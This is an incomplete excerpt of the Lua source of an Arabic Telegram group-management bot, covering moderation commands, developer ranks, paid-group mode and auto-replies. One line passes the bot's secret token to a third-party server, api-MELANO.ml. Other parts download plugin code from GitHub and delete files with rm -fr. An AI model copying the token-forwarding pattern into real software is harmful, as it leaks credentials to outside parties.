{text = '𝒘𝒂𝒕𝒂𝒏 𝒈𝒓𝒐𝒖𝒑',url="https://t.me/joinchat/MJjy8Vab_jVmODdi"}},
{{text = '𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓',url="t.me/abbasfadhil"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MELANOTEM&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع ملف السورس' or text == 'رفع الملف' and DevMELANO(msg) then   
...
if text == 'رفع نسخه الاحتياطيه' and DevMELANO(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'MELANOTEM')..') \n✯︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'MELANOTEM')..') \n✯︙تـم قفـل التاك بالكتم ')
end,nil)   
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تحديث' and DevMELANO(msg) then    
dofile('MELANO.lua')  
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevMELANO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevMELANO(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevMELANO(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevMELANO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevMELANO(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevMELANO(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevMELANO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevMELANO(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevMELANO(msg) then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("مسح المطورين") and DevMELANO(msg) then
...
if text == 'الملفات' and DevMELANO(msg) then
t = '✯︙ملفات السورس وطن ↓\n ٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
...
if DevMELANO(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/REXStEaM/Files_MELANO/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n✯︙اهلا بك في متجر ملفات وطن\n✯︙ملفات السورس ↓\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n\n"
local TextE = "\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙علامة تعني { ✔️ } ملف مفعل\n✯︙علامة تعني { ✖ } ملف معطل\n✯︙قناة سورس وطن ↓\n".." ✯︙[اضغط هنا لدخول](t.me/MELANOTEM) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and DevMELANO(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/REXStEaM/Files_MELANO/main/File_Bot/"..file)
if res == 200 then
...
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and DevMELANO(msg) then
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevMELANO(msg) then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevMELANO(msg) then
...
if text == "مسح الملفات" and DevMELANO(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ✯︙تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevMELANO(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevMELANO(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
HttpsMsg = https.request('https://api-MELANO.ml/abahi/abahi.php?Get=MELANO&TokenBot='..token..'&Url='..UrlId)
...
if database:get(bot_id..'DRAGOON:change:MELANO'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:MELANO'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:MELANO'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:MELANO'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:MELANO'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "abos-MELANO")
...
function Function_MELANO(extra, result, success)
database:sadd(bot_id.."Dev:MELANO:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✯︙تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_MELANO, nil)
return false 
end
...
function Function_MELANO(extra, result, success)
database:srem(bot_id.."Dev:MELANO:2", result.sender_user_id_)
...
function Function_MELANO(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:MELANO:2", result.id_)
...
database:srem(bot_id.."Dev:MELANO:2", userid)
...
database:del(bot_id.."Dev:MELANO:2")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'MELANOTEM')..')'
status  = '\n✯︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'MELANOTEM')..')'
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or MELANOTEM}},
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/MELANOTEM"}},
}
...
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/MELANOTEM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MELANOTEM&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
[✯︙ChAnNeL OF SoURcE](https://t.me/MELANOTEM)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/MELANOTEM"}},
...
{{text = 'MELANO TeaM .', url="t.me/MELANOTEM"}},
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح كليشه المطور' and DevMELANO(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'✯︙تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevMELANO(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'MELANOTEM')..')'..'\n✯︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الوضع المدفوع' and DevMELANO(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,MELANO) 
if not database:sismember(bot_id..'MELANO:ProGroups',msg.chat_id_) then
database:sadd(bot_id..'MELANO:ProGroups',msg.chat_id_) 
database:set(bot_id.."MELANO:ProGroups:Time"..msg.chat_id_,os.date("%Y/%m/%d"))
MELANO = '\n✯︙المجموعه ['..MELANO.title_..'] \n✯︙تم تفعيل الوضع المدفوع بتاريخ '..os.date("%Y/%m/%d")..' \n✯︙سينتهي الوضع المدفوع بعد 30 يوم من الان'
else
...
if text == 'تعطيل الوضع المدفوع' and DevMELANO(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,MELANO) 
if database:sismember(bot_id..'MELANO:ProGroups',msg.chat_id_) then
database:srem(bot_id..'MELANO:ProGroups',msg.chat_id_) 
database:del(bot_id.."MELANO:ProGroups:Time"..msg.chat_id_)
...
if text == 'المجموعات المدفوعه' or text == 'الكروبات المدفوعه' and DevMELANO(msg) then
local List = database:smembers(bot_id.."MELANO:ProGroups")
local MELANO = '✯︙المجموعات المدفوعه \n✯︙تاريخ اليوم'..os.date("%Y/%m/%d")..' \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n'
for k,v in pairs(List) do
local MELANOgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
...
if database:get(bot_id..'Bc:Bots') and not DevMELANO(msg) then 
...
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:MELANO:2',msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n✯︙ارسل الكلمه التي تريد اضافتها')
database:set(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:MELANO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:MELANO:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:MELANO:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"✯︙تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:MELANO:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:MELANO:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:MELANO:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:MELANO:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:MELANO:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:MELANO:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:MELANO:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:MELANO:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:MELANO:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:MELANO:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.',url="t.me/MELANOTEM"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."MELANOTEM:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'➫✿ تم تفعيل الانستا')
database:set(bot_id.."MELANOTEM:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."MELANOTEM:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."MELANOTEM:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"✯︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."MELANOTEM:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."MELANOTEM:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
database:set(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:MELANO:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"✯︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:MELANO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MELANO:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:MELANO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MELANO:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:MELANO:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:MELANO:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MELANO:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:MELANO:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:MELANO:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:MELANO:Add:Rd:Sudo:Text2"..text)   
...
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي") and msg.reply_to_message_id_ == 0 and DevMELANO(msg) then 
send(msg.chat_id_, msg.id_,'✯︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
database:setex(bot_id.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if database:get(bot_id.."Abs:EditDev"..msg.sender_user_id_) then
...
if text == 'تفعيل المغادره' and DevMELANO(msg) then   
...
if text == 'تعطيل المغادره' and DevMELANO(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'MELANOTEM')..')'
local iduser = result.sender_user_id_
...
local MELANO = '✯︙عدد الادمنيه : '..data.administrator_count_..
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,MELANO,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (MELANO.total_count_ or 0)
...
local rdphoto = MELANOa[math.random(#MELANOa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, MELANO.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
MELANO = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,MELANO)  
...
MELANO = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,MELANO)  
...
if text == 'استعاده الاوامر' and DevMELANO(msg) then
...
{
{text = '𝐖𝐀𝐓𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/MELANOTEM"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/MELANO"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
...
database:set(bot_id.." MELANO:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الزخرفه')
database:set(bot_id.." MELANO:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زغرفه (.*)$") and database:get(bot_id.." MELANO:zhrf_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." MELANO:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الابراج')
database:set(bot_id.." MELANO:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." MELANO:brj_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." MELANO:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل حساب العمر')
database:set(bot_id.." MELANO:age_Bots"..msg.chat_id_,"close")
...
database:set(bot_id.." MELANO:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." MELANO:age_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.."MELANO:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الافلام')
database:set(bot_id.."MELANO:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."MELANO:movie_bot"..msg.chat_id_) == "open" then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ ----- callback add dev mr MELANO
...
end -- end new msg dev.mr MELANO 
end -- end callback dev.mr MELANO
